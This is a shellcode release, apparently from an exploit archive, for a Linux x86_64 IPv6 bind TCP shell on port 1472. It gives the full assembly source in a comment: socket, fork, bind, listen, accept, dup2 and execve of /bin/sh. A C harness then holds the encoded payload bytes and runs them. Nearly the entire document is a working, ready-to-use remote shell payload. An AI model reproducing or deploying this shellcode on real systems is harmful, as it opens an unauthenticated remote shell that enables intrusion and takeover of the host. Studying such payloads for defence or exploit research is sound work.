/*
 # Title : Linux x86_64 bind tcp : port 1472 ipv6
 # Date : 02/05/2016
 # Author : Roziul Hasan Khan Shifat
 # Tested On : Ubuntu 14.04 LTS x86_64
 # Contact : shifath12@gmail.com
*/

/*

section .text
	global _start
_start:

;;socket()
xor rax,rax

push 6
push 0x1
push 10

pop rdi
pop rsi
pop rdx

mov al,41 ;socket()

syscall

;------------------------------------

xor r15,r15

mov r15,rax ;storing socket descriptor

;--------------------

;fork()


xor rax,rax
mov al,57
xor rdi,rdi
syscall

;-------------------

xor rdi,rdi
cmp rax,rdi

je ps

;-------------
;exit()
xor rax,rax
mov al,60
syscall
;--------------

ps:

;----------------
;bind()
xor rax,rax

push byte 28
pop rdx ;sizeof struct sock_addrin6

push rax ;sin6_scope_id

push rax ;sin6_addr
push rax ;sin6_addr

push rax ;sin6_flowinfo

push word 0xc005 ;sin6_port (htons(1472)) (U may change it)

push word 10 ;sin6_family

push rsp

pop rsi

mov rdi,r15 ;scoket des

mov al,49
syscall

;---------------------------------------
;listen()

mov rdi,r15
xor rsi,rsi
add rsi,2

xor rax,rax
mov al,50
syscall
;------------------------------------
;accept()

xor r9,r9
xor rdx,rdx
xor rsi,rsi
xor rax,rax

mov rdi,r15
mov dl,28

mov al,43
syscall
;------------------

mov r9,rax ;storing client descriptor

;-------------------
;close() closing socket descriptor
xor rax,rax

mov rdi,r15

mov al,3
syscall
;------------------

;;dup2(cd,0)
xor rsi,rsi
mul rsi

mov rdi,r9
mov al,33
syscall

;------------

;------------------

;;dup2(cd,1)
xor rax,rax
inc rsi

mov rdi,r9
mov al,33
syscall

;------------

;------------------

;;dup2(cd,2)
xor rax,rax
inc rsi

mov rdi,r9
mov al,33
syscall
jmp exe
;------------

exe:

;exeve(//bin/sh)
xor rdx,rdx
xor rsi,rsi
xor rdi,rdi
mul rdi

mov r10, 0x68732f6e69622f2f

shr r10,8;shift right 8 bit

push r10
push rsp
pop rdi

mov al,59
syscall

*/


#include<stdio.h>
#include<string.h>
char shellcode[] ="\x48\x31\xc0\x6a\x06\x6a\x01\x6a\x0a\x5f\x5e\x5a\xb0\x29\x0f\x05\x4d\x31\xff\x49\x89\xc7\x48\x31\xc0\xb0\x39\x48\x31\xff\x0f\x05\x48\x31\xff\x48\x39\xf8\x74\x07\x48\x31\xc0\xb0\x3c\x0f\x05\x48\x31\xc0\x6a\x1c\x5a\x50\x50\x50\x50\x66\x68\x05\xc0\x66\x6a\x0a\x54\x5e\x4c\x89\xff\xb0\x31\x0f\x05\x4c\x89\xff\x48\x31\xf6\x48\x83\xc6\x02\x48\x31\xc0\xb0\x32\x0f\x05\x4d\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xc0\x4c\x89\xff\xb2\x1c\xb0\x2b\x0f\x05\x49\x89\xc1\x48\x31\xc0\x4c\x89\xff\xb0\x03\x0f\x05\x48\x31\xf6\x48\xf7\xe6\x4c\x89\xcf\xb0\x21\x0f\x05\x48\x31\xc0\x48\xff\xc6\x4c\x89\xcf\xb0\x21\x0f\x05\x48\x31\xc0\x48\xff\xc6\x4c\x89\xcf\xb0\x21\x0f\x05\xeb\x00\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\xf7\xe7\x49\xba\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xea\x08\x41\x52\x54\x5f\xb0\x3b\x0f\x05";

main()
{

printf("shellcode length %ld\n",(unsigned long)strlen(shellcode));

(* (int(*)()) shellcode) ();


return 0;
}